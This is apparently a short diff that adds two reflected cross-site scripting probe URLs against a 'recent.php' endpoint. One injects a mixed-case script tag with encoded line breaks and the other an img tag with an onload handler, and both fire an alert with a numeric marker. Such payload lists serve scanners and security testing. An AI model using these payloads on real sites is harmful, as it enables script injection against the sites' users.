@@ -1,0 +1,2 @@
+http://www.example.com/sm-bc120/recent.php?type=&lt;ScRiPt%20%0a%0d&gt;alert(213771818860)%3B&lt;/ScRiPt&gt;
+http://www.example.com/sm-bc120/recent.php?type=&lt;img+src=http://www.example.org/matrix.jpg+onload=alert(213771818860)&gt;
